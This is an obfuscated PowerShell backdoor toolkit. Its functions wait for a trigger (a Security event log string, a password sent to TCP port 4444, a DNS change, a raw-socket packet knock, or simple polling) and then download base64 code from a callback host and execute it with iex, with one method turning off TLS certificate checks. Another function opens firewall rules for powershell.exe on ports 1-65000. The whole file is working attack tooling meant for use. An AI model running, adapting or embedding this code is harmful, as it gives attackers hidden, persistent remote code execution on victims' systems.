 $5kzyIT =  [TYpE]("{4}{0}{1}{2}{3}" -F'e','t.SErV','I','CEPoinTmanAGeR','sySTem.n')  ;   $nzV2aP =[tyPe]("{1}{3}{2}{4}{0}"-F 'Rt','SYs','n','tEm.Co','vE') ;  seT ('T'+'1o5')  (  [Type]("{0}{3}{1}{2}" -f'sysTEM.T','nC','oding','exT.e') ) ;SeT-ITEM ("{3}{2}{0}{1}{4}" -f':Tr','i','bLe','varIa','XE') ( [tYPe]("{0}{3}{2}{1}"-F'sysTEm','s','.Dn','.neT') ) ; seT ("ZN"+"u")  (  [type]("{2}{1}{3}{4}{5}{0}{6}" -F 't','ecURitY.PRiNC','s','ipAL.wInDoWs','ID','en','itY'))  ; SET-itEm  ("VArIABle"+":q8WgP"+"c")  ( [TypE]("{0}{1}"-f'rE','gEX'))  ;  Sv  ("{1}{0}" -f 'iUY','l8f') ([typE]("{3}{2}{4}{1}{0}" -f 'EtS.aDDReSsFaMIlY','K','t','NE','.SOc'));sEt-iteM  ("{0}{3}{2}{1}"-f 'vaRiAb','pVj','4','lE:26') ( [typE]("{0}{5}{2}{4}{3}{1}"-F'nET.S','kettYpE','cKeTS.','Oc','s','o') )  ;   SEt-IteM ("{2}{0}{3}{1}"-f 'blE','ACs','VArIa',':E') ([TYPE]("{2}{4}{3}{6}{1}{5}{0}{7}" -F'lT','o','neT.sO','KeT','c','TOcO','S.Pr','yPE') );  set-iTEM ("{3}{2}{0}{1}" -f 'bLE:','jMHB','aRiA','v')  ([TYpE]("{1}{6}{2}{3}{5}{4}{0}" -F'e','NET','SOCkeTS','.IOCOnt','D','rOLCO','.'))  ;   sET-ITem ("vA"+"rIabLE:y"+"4"+"h"+"br") ( [tYpe]("{0}{1}{3}{4}{2}"-f 'NeT.SO','CKeTs.socKETFL','S','A','G'));    Sv  ("I6S"+"5nr") ( [tYpE]("{0}{1}{2}"-f'daT','ET','Ime'));







function iNv`okE-Ca`LlbAck`IEx
{

	Param(
	[Parameter(mANDatOry=${Tr`uE},poSitION=1)]
	[string]${cAl`l`BAcKip},
	[Parameter(mandatoRy=${Fa`LSE},poSitIoN=2)]
	[int]${me`T`hOD}=0,
	[Parameter(MAndaToRy=${F`AlSE},posITION=3)]
	[string]${bI`TSt`eMPFi`Le}="$env:temp\ps_conf.cfg",
	[Parameter(mANDAtOrY=${F`ALse},POsiTIoN=4)]
	[string]${R`E`SouRCe}="/favicon.ico",
	[Parameter(MaNDaTory=${FA`lsE},POsITIon=5)]
	[bool]${sI`lENT}=${f`A`lSE}
	)
	
	
	if(${c`All`Ba`ckIP})
	{
		try {
			
			if (${Met`H`OD} -eq 0)
			{
				
				${u`RL}="http://$CallbackIP$resource"
				if(-not ${SiL`enT}) {write-host "Calling home with method $method to: $url"}
				
				${e`NC} = (new-object ("{2}{0}{1}"-f 't','.webclient','ne'))."dOwn`loA`D`String"(${U`Rl})
			}
			
			elseif (${meT`h`od} -eq 1)
			{
				 $5KZYIt::"S`eRv`e`RC`e`RTiFIcatEVali`DATiON`cAlLB`A`ck" = {${tr`ue}}
				${u`RL}="https://$CallbackIP$resource"
				if(-not ${s`IlenT}) {write-host "Calling home with method $method to: $url"}
				
				${E`Nc} = (new-object ("{0}{2}{1}"-f'net.','client','web'))."DO`WnlOaD`St`Ring"(${u`RL})
			}
			
			elseif (${me`TH`oD} -eq 2)
			{
				${u`RL}="http://$CallbackIP$resource"
				if(-not ${s`iL`EnT}) { write-host "Calling home with method $method to: $url"
				write-host "BITS Temp output to: $BitsTempFile"}
				Import-Module ("{0}{1}" -f '*','bits*')
				Start-BitsTransfer ${u`RL} ${biTS`T`EM`p`FIle} -ErrorAction ("{1}{0}" -f'op','St')
				
				${e`NC} = Get-Content ${biT`StEMp`FILe} -ErrorAction ("{1}{0}"-f'p','Sto')
				
				
				Remove-Item ${B`It`St`eMpF`iLe} -ErrorAction ("{1}{3}{2}{0}"-f 'tinue','Si','entlyCon','l')
				
			}
			else 
			{
				if(-not ${s`I`leNt}) { write-host "Error: Improper callback method" -fore ("{1}{0}"-f 'ed','r')}
				return 0
			}
			
			
			if (${e`Nc})
			{
				
				${B} =   (Gi  ("{0}{1}{3}{2}"-f'VarIA','BLe:nz','p','v2A')  ).vALuE::"f`RombAS`E64`stR`ING"(${E`NC})
				${D`Ec} =  (  gI ("VArIA"+"ble"+":T1o5")).VaLuE::"U`Tf8"."gETStr`i`NG"(${b})
				
				
				iex ${D`EC}
			}
			else
			{
				if(-not ${s`ILE`Nt}) { write-host "Error: No Data Downloaded" -fore ("{0}{1}"-f'r','ed')}
				return 0
			}
		}
		catch [System.Net.WebException]{
			if(-not ${sIl`Ent}) { write-host "Error: Network Callback failed" -fore ("{0}{1}" -f'r','ed')}
			return 0
		}
		catch [System.FormatException]{
			if(-not ${s`IlE`NT}) { write-host "Error: Base64 Format Problem" -fore ("{1}{0}" -f 'ed','r')}
			return 0
		}
		catch [System.Exception]{
			if(-not ${S`ILEnt}) { write-host "Error: Uknown problem during transfer" -fore ("{0}{1}" -f 'r','ed')}
			
			return 0
		}
	}
	else
	{
		if(-not ${sile`NT}) { write-host "No host specified for the phone home :(" -fore ("{1}{0}"-f'ed','r')}
		return 0
	}
	
	return 1
}

function Ad`D-PS`FIrE`wA`LLru`Les
{

	Param(
	[Parameter(MaNDaToRY=${FA`LsE},pOsITion=1)]
	[string]${ruL`en`Ame}="Windows Powershell",
	[Parameter(maNDAtorY=${F`A`lSe},PoSItioN=2)]
	[string]${e`xE`PATH}="C:\windows\system32\windowspowershell\v1.0\powershell.exe",
	[Parameter(maNdatOry=${fAL`SE},poSitIon=3)]
	[string]${P`oRtS}="1-65000"
	)

	If (-NOT ([Security.Principal.WindowsPrincipal]  (GeT-vArIAblE ("zN"+"U")  -ValueO  )::"GEtCu`RR`eNt"())."IS`inR`OLe"([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This command requires Admin :(... get to work! "
		Return
	}
	
	
	${fw} = New-Object -ComObject ("{2}{1}{3}{0}"-f'2','cfg.fwp','hnet','olicy')
	${R`ULE} = New-Object -ComObject ("{2}{1}{3}{0}" -f 'e','NetCf','H','g.FWRul')
	${R`ulE}."n`AME" = ${Rul`E`Na`ME}
	${R`ULE}."apP`LICAt`I`Onna`Me"=${e`XEPA`TH}
	${RU`Le}."p`RO`TOcOL" = 6
	${rU`LE}."loC`A`LPOrTS" = ${p`oRtS}
	${ru`LE}."dI`ReCTIOn" = 2
	${Ru`Le}."E`NA`BlED"=${t`RuE}
	${R`Ule}."g`Ro`upinG"="@firewallapi.dll,-23255"
	${ru`LE}."pro`FiL`ES" = 7
	${R`uLe}."A`cTiON"=1
	${r`uLe}."EDGetRA`V`E`RSAl"=${f`AlSE}
	${fw}."r`ulES"."a`Dd"(${ru`lE})
	
	
	${r`ULe} = New-Object -ComObject ("{3}{0}{2}{1}"-f '.FWR','le','u','HNetCfg')
	${rU`Le}."Na`Me" = ${RulE`NAME}
	${Ru`Le}."APPLICa`Tio`NN`A`me"=${E`x`EpAth}
	${rU`LE}."p`RoTOcoL" = 17
	${r`ule}."LoCAL`po`RTS" = ${P`orTs}
	${rU`le}."DiRe`cTI`ON" = 2
	${RU`le}."en`AblEd"=${tR`uE}
	${R`uLE}."GroupI`Ng"="@firewallapi.dll,-23255"
	${R`uLe}."p`ROfi`LEs" = 7
	${R`ULe}."aCt`i`oN"=1
	${Ru`Le}."EDgeTrAVE`R`saL"=${f`A`lse}
	${Fw}."Rul`es"."a`dd"(${r`uLE})
	
	
	${ru`LE} = New-Object -ComObject ("{1}{0}{2}{3}"-f'fg.F','HNetC','WRu','le')
	${rU`Le}."NA`mE" = ${Ru`le`NAme}
	${R`ULe}."a`ppLICationNa`ME"=${E`XepAth}
	${Ru`LE}."P`R`otOcOl" = 6
	${R`UlE}."L`O`caLporTS" = ${Por`Ts}
	${R`ulE}."d`I`REcTiOn" = 1
	${ru`lE}."ENA`BL`ED"=${tr`UE}
	${r`UlE}."gro`uPI`Ng"="@firewallapi.dll,-23255"
	${r`uLE}."Pr`O`FILEs" = 7
	${r`Ule}."A`C`TiON"=1
	${ru`lE}."EDgE`TRAV`ERSaL"=${fA`lsE}
	${F`w}."RU`les"."A`dd"(${RU`lE})
	
	
	${r`UlE} = New-Object -ComObject ("{0}{1}{2}{3}" -f 'H','NetCfg','.FW','Rule')
	${r`uLE}."n`AMe" = ${ruleNa`me}
	${Ru`le}."APp`LicaT`I`oN`NamE"=${ExePa`TH}
	${rU`Le}."P`Rot`OCol" = 17
	${RU`Le}."Loc`Alp`ORTs" = ${poR`Ts}
	${r`ulE}."DIRectI`on" = 1
	${r`ulE}."en`A`BLeD"=${t`Rue}
	${RU`Le}."Gr`oUP`iNG"="@firewallapi.dll,-23255"
	${r`UlE}."PrO`F`ileS" = 7
	${r`uLE}."A`CTI`ON"=1
	${R`ule}."Ed`gET`RaV`eRsaL"=${F`ALSe}
	${F`W}."r`uLEs"."A`Dd"(${R`ule})

}

function InVOk`e`-EVeNTLoop
{

	Param(
	[Parameter(mANdAtOry=${T`RUE},POsiTion=1)]
	[string]${cAlLBa`Ck`Ip},
	[Parameter(MaNdAtoRY=${fA`lSE},PosITion=2)]	
	[string]${tRI`GG`ER}="SIXDUB", 
	[Parameter(MAnDaTORy=${F`AL`SE},PoSITIOn=3)]
	[int]${tiM`EoUt}=0,
	[Parameter(maNDatOry=${fA`LSE},PosiTiON=4)]
	[int] ${s`lEEP}=1
	)

	If (-NOT ([Security.Principal.WindowsPrincipal]   (  vARIABLe ('z'+'NU') -vALUEONl)::"gEtc`ur`ReNT"())."IsiN`RoLE"([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This backdoor requires Admin :(... get to work! "
		Return
	}
	
	write-host "Timeout: $Timeout"
	write-host "Trigger: $Trigger"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	${rUN`Ni`NG}=${t`RUE}
	${mAT`ch} =""
	${s`TArt`TImE} = get-date
	while(${runn`i`Ng})
	{
		
		if (${timE`ouT} -ne 0 -and ($(  (  vaRIAble ('I6S5n'+'r')  ).VALuE::"N`OW") -gt ${st`A`RTtI`mE}."aDDs`ECO`NDs"(${ti`MEO`ut})))  
		{
			${rUn`N`inG}=${FA`lSE}
		}
		
		${D} = Get-Date
		${n`eW`EVEnTs} = Get-WinEvent -FilterHashtable @{"l`og`NAMe"='Security'; "ST`ArTT`IME"=${D}."aDDSecO`N`DS"(-${Sl`eEp})} -ErrorAction ("{2}{1}{0}"-f'ntinue','Co','Silently') | fl ("{1}{2}{0}" -f'e','M','essag') | Out-String
		
		
		if (${nEw`even`TS} -match ${Tri`Gg`eR})
		{
				${runN`i`NG}=${FA`lSE}
				${MAt`Ch} = ${C`Al`lbA`ckIP}
				write-host "Match: $match"
		}
		sleep -s ${Sl`E`EP}
	}
	if(${m`Atch})
	{
		${suc`c`ESS} = Invoke-CallbackIEX ${MA`T`Ch}
	}
}

function iNvo`KE`-pORTB`i`ND
{

	Param(
	[Parameter(MANdatory=${f`AlsE},PoSiTion=1)]
	[string]${Cal`L`BAckiP},
	[Parameter(maNDaTOrY=${fA`lse},pOSItIon=2)]
	[string]${L`ocalIP}, 
	[Parameter(mANDatorY=${f`ALSe},POsitION=3)]
	[int]${P`OrT}=4444, 
	[Parameter(maNdAToRy=${F`AlsE},pOSiTIoN=4)]
	[string]${t`R`iGgEr}="QAZWSX123", 
	[Parameter(MAnDAtoRY=${FA`LSE},POSiTion=5)]
	[int]${TIM`E`ouT}=0
	)
	
	
	if (-not ${LOc`A`lIP}) 
	{
		route ("{1}{0}"-f'int','pr') ('0*') | % { 
			if (${_} -match "\s{2,}0\.0\.0\.0") { 
				${N`ulL},${NU`ll},${N`ulL},${L`oCALIP},${n`uLl} =   (VARiABle  ('Q8w'+'Gpc') -VaLUeoNL  )::"REp`LA`cE"(${_}."trI`MSTa`RT"(" "),"\s{2,}",",")."sPl`it"(",")
				}
			}
	}
	
	
	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	write-host "Timeout: $Timeout"
	write-host "Port: $Port"
	write-host "Trigger: $Trigger"
	write-host "Using IPv4 Address: $LocalIP"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	try{
		
		
		${iPeNd`POi`Nt} = new-object ("{2}{1}{0}{5}{4}{3}" -f't.ip','m.ne','syste','t','in','endpo')([net.ipaddress]"$localIP",${P`Ort})
		${li`sTE`NEr} = new-object ("{0}{2}{7}{4}{6}{8}{1}{5}{3}" -f 'Sys','n','tem.','r','ock','e','ets.TcpLi','Net.S','ste') ${i`p`En`DPoinT}
		${L`Isten`er}."St`Art"()
		
		
		${RU`N`NinG}=${tr`Ue}
		${M`AtCH} =""
		${sta`R`TTi`ME} = get-date
		while(${RU`Nn`inG})
		{			
			
			if (${T`IMEO`ut} -ne 0 -and ($( ( Gi  ("{2}{0}{3}{1}"-f 'RiaBlE','5NR','VA',':I6S')  ).VALue::"N`ow") -gt ${St`AR`TTIME}."Ad`d`sECoNds"(${Ti`M`eOuT})))  
			{
				${Ru`NN`inG}=${Fa`L`se}
			}
			
			
			if(${l`ISTE`NER}."Pe`Nd`Ing"())
			{
				
				${cL`I`EnT} = ${liSt`EN`Er}."accE`PTtcp`cl`IE`Nt"()
				write-host "Client Connected!"
				${S`TR`eam} = ${cl`IENT}."Ge`Tst`REAm"()
				${REAd`ER} = new-object ("{3}{0}{4}{2}{1}" -f 'IO.','eader','reamR','System.','St') ${st`REAm}
				
				
				${Li`NE} = ${RE`AD`Er}."reA`D`Line"()
				
				
				if (${LI`Ne} -eq ${tRIG`G`Er})
				{
					${ru`Nni`Ng}=${FA`lSE}
					${M`AT`CH} = ([system.net.ipendpoint] ${C`LI`enT}."cL`ieNt"."rEmotE`enDP`O`i`Nt")."aDD`R`ESS"."tOsTr`ING"()
					write-host "MATCH: $match"
				}
				
				
				${reaD`eR}."dI`SpoSe"()
				${ST`R`eAM}."dISPO`SE"()
				${cli`E`NT}."c`LosE"()
				write-host "Client Disconnected"
			}
		}
		
		
		write-host "Stopping Socket"
		${l`ISTenEr}."s`TOp"()
		if(${mA`TCh})
		{
			if(${CA`lLb`A`Ckip})
			{
				${Suc`CesS} = Invoke-CallbackIEX ${c`AlLbA`cKIp}
			}
			else
			{
				${SuC`cE`Ss} = Invoke-CallbackIEX ${MAt`Ch}
			}
		}
	}
	catch [System.Net.Sockets.SocketException] {
		write-host "Error: Socket Error" -fore ("{0}{1}"-f're','d')
	}
}

function InVo`kE`-`DNsL`OOp
{

	param(
		[Parameter(mAndATOry=${FA`lse},pOsiTIOn=1)]
		[string]${C`AllBack`IP},
		[Parameter(MandATOrY=${fa`l`se},POsitioN=2)]
		[string]${HO`S`TnaMe}="yay.sixdub.net",
		[Parameter(MaNDaTOry=${fA`lSe},POsitiOn=3)]
		[string]${TrIg`G`ER}="127.0.0.1",
		[Parameter(MaNDaToRY=${F`Al`se},PoSItIOn=4)]
		[int] ${TIme`O`Ut}=0,
		[Parameter(mAnDAtory=${Fa`l`SE},PoSItioN=5)]
		[int] ${sLe`Ep}=1
	)
	
	
	write-host "Timeout: $Timeout"
	write-host "Sleep Time: $Sleep"
	write-host "Trigger: $Trigger"
	write-host "Using Hostname: $Hostname"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	${r`UN`NinG}=${tr`ue}
	${mat`cH} =""
	${Sta`RTt`ime} = get-date
	while(${RUn`NIng})
	{
		
		if (${Tim`EouT} -ne 0 -and ($(  ( gET-vARIAble  ("I6s5"+"Nr")  ).value::"N`Ow") -gt ${Sta`R`TtiME}."aDDSec`O`Nds"(${TIM`eO`Ut})))  
		{
			${R`uN`NInG}=${Fa`L`sE}
		}
		
		try {
			
			${I`pS} =  (  Get-VArIABle ("{1}{0}"-f 'RIxE','t') -vA)::"gEtH`OsTaD`DrEsS`Es"(${HO`stN`A`ME})
			foreach (${ad`Dr} in ${I`Ps})
			{
				
				
				${r`Es`OL`Ved}=${a`DDR}."IpADdrESsT`Os`T`RING"
				if(${reS`OL`VEd} -ne ${tR`I`Gger})
				{
					${RuN`NIng}=${F`AL`Se}
					${mA`TcH}=${re`SOLv`Ed}
					write-host "Match: $match"
				}
				
			}
		}
		catch [System.Net.Sockets.SocketException]{
			
		}

		sleep -s ${s`L`eEp}
	}
	write-host "Shutting down DNS Check..."
	if(${ma`Tch})
	{
		if(${CAlLbAc`K`IP})
		{
			${su`cce`ss} = Invoke-CallbackIEX ${cA`lLBack`ip}
		}
		else
		{
			${su`ccE`sS} = Invoke-CallbackIEX ${m`ATch}
		}
	}
}

function inVok`e-P`ACKe`TkNOcK
{	

	param(
	[Parameter(MANdaTorY=${faL`sE},pOsitIoN=1)]
	[string]${CaLL`B`Ack`iP},
	[Parameter(MANdatoRy=${f`Alse},POSiTion=2)]
	[string]${lo`cAL`iP}, 
	[Parameter(maNdatOrY=${f`AlSE},PoSiTIOn=3)]
	[string]${tRIgG`eR}="QAZWSX123", 
	[Parameter(mAndaTORY=${fal`SE},pOsITIon=4)]
	[int]${tI`Me`OUt}=0
	)
	If (-NOT ([Security.Principal.WindowsPrincipal]   ( get-VARIABle  ("Zn"+"u")  -vaLueONLy)::"GE`TCuRr`e`NT"())."i`sIn`RoLe"([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This backdoor requires Admin :(... get to work! "
		Return
	}
	
	if (-not ${lo`caLIP}) 
	{
		route ("{1}{0}" -f'int','pr') ('0*') | % { 
			if (${_} -match "\s{2,}0\.0\.0\.0") { 
				${nU`lL},${n`ULL},${nu`Ll},${L`oC`AliP},${n`ull} =  (  lS ("vaRIaBlE"+":Q8WgP"+"C")  ).vALue::"re`P`lACE"(${_}."T`Ri`mStArT"(" "),"\s{2,}",",")."SP`lIt"(",")
				}
			}
	}
	
	
	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	write-host "Timeout: $Timeout"
	write-host "Trigger: $Trigger"
	write-host "Using IPv4 Address: $LocalIP"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	${BY`TE`IN} = new-object ("{1}{0}" -f 'te[]','by') 4
	${BY`TE`oUT} = new-object ("{2}{0}{1}" -f't','e[]','by') 4
	${by`T`edata} = new-object ("{0}{1}" -f 'byte[',']') 4096  

	${BYTE`iN}[0] = 1  
	${b`YT`EIn}[1-3] = 0
	${byT`eOut}[0-3] = 0
	
	
	${s`OCket} = new-object ("{5}{3}{2}{6}{4}{0}{1}" -f 'kets','.socket','n','stem.','soc','sy','et.')(  (DIR  ("{2}{0}{3}{1}{4}"-f'lE:','fI','vaRIAb','L8','uY')).value::"iNte`R`Ne`TwoRk",  (GCi  ("{1}{0}{2}{3}"-f'aRIABLe:2','v','64p','VJ') ).ValUE::"r`AW",  $EaCs::"Ip")
	${s`ocK`Et}."sEtSOc`ketopti`On"("IP","HeaderIncluded",${t`RUe})
	${So`CK`eT}."re`ceIve`BufFEr`sIzE" = 819200

	
	${i`pE`N`dpoint} = new-object ("{6}{2}{0}{5}{4}{1}{3}"-f'em.n','i','t','nt','ipendpo','et.','sys')([net.ipaddress]"$localIP",0)
	${S`OCkEt}."b`inD"(${i`pendP`oI`NT})

	
	[void]${s`Oc`kEt}."IocoNtr`ol"( $jmhB::"r`EceIV`eA`ll",${bYT`eiN},${B`yT`eoUt})

	
	${s`T`AR`TTiME} = get-date
	${rUN`NiNG} = ${Tr`Ue}
	${MAt`cH} = ""
	${p`Ack`Ets} = @()
	while (${r`UN`NiNg})
	{
		
		if (${T`I`MeOut} -ne 0 -and ($( (GET-chIldiTEM  ("{3}{0}{4}{2}{1}"-f'arIABLe:','s5NR','6','V','i') ).vaLUe::"N`OW") -gt ${St`A`R`TtimE}."a`d`dsecONDS"(${tI`MeoUT})))  
		{
			${RU`Nn`INg}=${f`ALSe}
		}
		
		if (-not ${S`oCkeT}."aV`AIlA`BLe")
		{
			start-sleep -milliseconds 500
			continue
		}
		
		
		${R`cV} = ${s`Ock`ET}."rE`Ce`IVe"(${Byt`E`DATA},0,${BYTe`d`A`Ta}."lEN`GtH",  $y4HBR::"NO`NE")

		
		${meMOr`YS`Tr`eAm} = new-object ("{5}{6}{3}{1}{2}{0}{4}" -f 'mo','.M','e','O','ryStream','Syste','m.I')(${B`Y`TedatA},0,${r`cv})
		${B`InArYRE`A`Der} = new-object ("{0}{4}{1}{3}{2}"-f 'Syst','.Bi','der','naryRea','em.IO')(${mEm`o`RYstREAM})
		
		
		${T`RaSH}  = ${B`iN`A`RYrea`DER}."rE`A`DbytEs"(12)
		
		
		${SO`Ur`Ceip`A`dDRess} = ${BInA`RYREa`DEr}."reA`DUin`T32"()
		${sOU`Rc`Eip`AddrEsS} = [System.Net.IPAddress]${SO`U`RceiP`ADD`REss}
		${Des`TinAtiOnIP`A`DD`RESs} = ${B`InaRYr`e`ADeR}."reAd`u`INt32"()
		${d`ESt`i`NA`TioNIPAd`Dre`SS} = [System.Net.IPAddress]${de`s`T`INAtIONIpaddR`E`ss}
		${REmai`NDerb`Y`Tes} = ${bIn`ArY`R`EAder}."R`EA`DbYTeS"(${me`M`OrysT`Re`AM}."l`En`gTH")
		
		
		${ASciie`N`CODIng} = new-object ("{3}{1}{4}{2}{0}" -f 'iiencoding','stem','xt.asc','sy','.te')
		${reMaINd`E`ROfPAcK`et} = ${asc`Iienc`oDing}."g`ETS`TRINg"(${remai`Nder`B`Y`Tes})
		
		
		${b`InarY`R`EaDEr}."c`loSe"()
		${m`eM`OryStR`E`AM}."Cl`Ose"()
		
		
		if (${R`EmA`IndER`OFPA`C`KEt} -match ${T`RiG`ger})
		{
			write-host "Match: " ${SourCE`iPa`D`d`ReSS}
			${r`uNNi`Ng}=${FAl`SE}
			${MAt`ch} = ${S`ourCEIpaD`d`Re`sS}
		}
	}
	
	if(${MA`T`CH})
	{
		if(${cAL`lB`AcK`ip})
		{
			${S`uCC`EsS} = Invoke-CallbackIEX ${C`A`llbaCKIp}
		}
		else
		{
			${sU`Cce`ss} = Invoke-CallbackIEX ${Ma`Tch}
		}
	}
	
}

function i`N`Vok`E-CalLb`AC`KLOop
{

	Param(  
	[Parameter(MaNdATorY=${tR`uE},PoSitIoN=1)]
	[string]${c`All`Ba`ckIP},
	[Parameter(maNDatoRY=${f`AL`se},poSItION=2)]
	[int]${tiME`O`ut}=0,
	[Parameter(ManDATORy=${Fa`LSE},poSiTion=3)]
	[int] ${Sle`Ep}=1
	)
	
		
	write-host "Timeout: $Timeout"
	write-host "Sleep: $Sleep"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	${Runn`I`NG}=${t`RuE}
	${ma`T`ch} =""
	${s`TART`TiMe} = get-date
	while(${r`u`NNing})
	{
		
		if (${Ti`MeOuT} -ne 0 -and ($( ( gET-VARIAblE ("i6S"+"5nR") -vAlue)::"n`ow") -gt ${St`ArTTi`mE}."addS`e`conds"(${TI`mE`ouT})))  
		{
			${Ru`N`NiNg}=${F`Al`sE}
		}
		
		${Ch`E`cksucce`ss} = Invoke-CallbackIEX ${C`ALLB`AcKiP} -Silent ${Tr`uE}
		
		if(${ch`e`ckS`UCc`ESs} -eq 1)
		{
			${R`unn`inG}=${fal`Se}
		}
		
		sleep -s ${s`l`EeP}
	}
	
	write-host "Shutting down backdoor..."
}